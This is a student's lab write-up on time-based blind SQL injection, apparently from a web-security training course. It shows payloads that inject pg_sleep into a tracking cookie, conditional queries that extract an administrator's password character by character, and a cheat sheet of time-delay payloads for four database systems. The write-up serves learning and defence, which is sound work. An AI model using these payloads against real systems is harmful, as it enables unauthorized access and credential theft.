## Lab 8 — Blind SQL Injection with Time Delays

### Goal

Exploit a blind SQL injection vulnerability using database time delays.

The first part of the lab was to cause a measurable delay. The second part
was to use conditional delays to retrieve the administrator's password.

### What I Observed

The application:

- Did not return the SQL query results.
- Did not respond differently when the query returned rows.
- Did not respond differently when the query caused an error.
- Executed the SQL query synchronously.

Because the application waited for the SQL query to finish, the response time
could be used as an information channel.

### Step 1 — Trigger a Time Delay

I used:

```text
TrackingId=x'||pg_sleep(10)--
````

The application took approximately 10 seconds to respond.

`pg_sleep(10)` is a PostgreSQL function that pauses execution for 10 seconds.

The `--` comments out the remaining part of the SQL query.

This confirmed that I could control the execution time of the query.

### Step 2 — Use Conditional Time Delays

The next lab required me to retrieve the administrator's password.

Instead of always causing a delay, I made the delay happen only when a
condition was true.

#### Determine the Password Length

I used:

```text
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

The logic was:

```sql
CASE
    WHEN username = 'administrator' AND LENGTH(password) = 20
    THEN pg_sleep(10)
    ELSE pg_sleep(0)
END
```

When the password length was correct, the response was delayed by
approximately 10 seconds.

This allowed me to determine the password length.

#### Extract the Password Character by Character

After determining the length, I tested each character individually:

```text
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+(SUBSTRING(password,position,1)='a'))+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--
```

I changed:

* `position` to test each character position.
* `'a'` to test different possible characters.

The logic was:

```text
Condition TRUE
      ↓
pg_sleep()
      ↓
Delayed response
```

```text
Condition FALSE
      ↓
pg_sleep(0)
      ↓
Normal response
```

I repeated this process for every character until I recovered the
administrator password.

### Why It Worked

Time-based blind SQL injection works by turning response time into a
true/false signal.

Unlike other blind SQLi techniques, the application does not need to display
the query result or an error.

I only need to be able to distinguish between:

```text
TRUE  → delayed response
FALSE → normal response
```

This allows hidden information to be extracted one character at a time.

### What I Learned

* Blind SQL injection can use response time as an information channel.
* Database-specific sleep functions can introduce measurable delays.
* Time delays can be made conditional using SQL logic.
* `CASE WHEN` can control whether a delay occurs.
* `LENGTH()` can determine the length of a secret value.
* `SUBSTRING()` can extract individual characters.
* Time-based blind SQLi can be used to retrieve sensitive information
  character by character.
* The exact time-delay syntax depends on the database management system.
* Burp Repeater is useful for manually testing time delays.
* Burp Intruder can automate testing different positions and characters.

## Time-Delay Payloads by Database

The exact syntax depends on the database management system.

### PostgreSQL

Basic delay:

```sql
'||pg_sleep(10)--
```

Example:

```text
TrackingId=x'||pg_sleep(10)--
```

Conditional delay:

```sql
CASE WHEN condition THEN pg_sleep(10) ELSE pg_sleep(0) END
```

### MySQL

Basic delay:

```sql
' AND SLEEP(10)--
```

Example:

```text
TrackingId=x' AND SLEEP(10)--
```

Conditional delay:

```sql
' AND IF(condition,SLEEP(10),0)--
```

### Microsoft SQL Server

Basic delay:

```sql
'; WAITFOR DELAY '0:0:10'--
```

Example:

```text
TrackingId=x'; WAITFOR DELAY '0:0:10'--
```

Conditional delay:

```sql
'; IF (condition) WAITFOR DELAY '0:0:10'--
```

### Oracle

Oracle does not have a simple `SLEEP()` function like PostgreSQL or MySQL.

A commonly used technique is:

```sql
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--
```

Example:

```text
TrackingId=x' AND DBMS_PIPE.RECEIVE_MESSAGE('x',10)=0--
```

### Important Note

Time-delay functions are database-specific.

If a time-based SQL injection payload does not work, the database type and
the context in which the input is inserted need to be considered.

## Blind SQL Injection Techniques Learned

### Conditional Responses

Use a difference in the application's normal response to determine whether a
condition is true or false.

```text
TRUE  → "Welcome back"
FALSE → normal response
```

### Conditional Errors

Deliberately trigger an SQL error when a condition is true.

```text
TRUE  → SQL error
FALSE → normal response
```

### Conditional Time Delays

Deliberately delay the database when a condition is true.

```text
TRUE  → delayed response
FALSE → normal response
```

The underlying idea is the same:

> Find an observable difference that allows a hidden SQL condition to be
> interpreted as TRUE or FALSE.
